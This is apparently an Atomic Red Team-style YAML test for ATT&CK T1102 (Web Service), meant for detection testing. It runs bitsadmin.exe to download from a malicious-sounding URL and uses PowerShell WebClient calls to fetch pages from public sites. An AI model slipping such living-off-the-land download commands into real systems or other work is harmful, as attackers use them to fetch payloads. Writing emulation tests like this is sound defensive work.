---
attack_technique: T1102
display_name: Web Service

atomic_tests:
- name: Reach out to C2 Pointer URLs via command_prompt
  description: |
    Ping a list of C2 pointer URLs. These urls in command lines may be malicious

    Recommended Detection: monitor for a list of these urls, or a regex that catches web URLs
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ C:\bitsadmindownload.html
    cleanup_command: |
      del C:\bitsadmindownload.html


- name: Reach out to C2 Pointer URLs via powershell
  description: |
    Ping a list of C2 pointer URLs. These urls in command lines may be malicious

    Recommended Detection: monitor for a list of these urls, or the ".com" in command line arguments
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      Invoke-WebRequest -Uri www.twitter.com
      $T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
      $wc = New-Object System.Net.WebClient
      $T1102 = $wc.DownloadString("https://www.aol.com/")
    cleanup_command: |
      Clear-Variable T1102
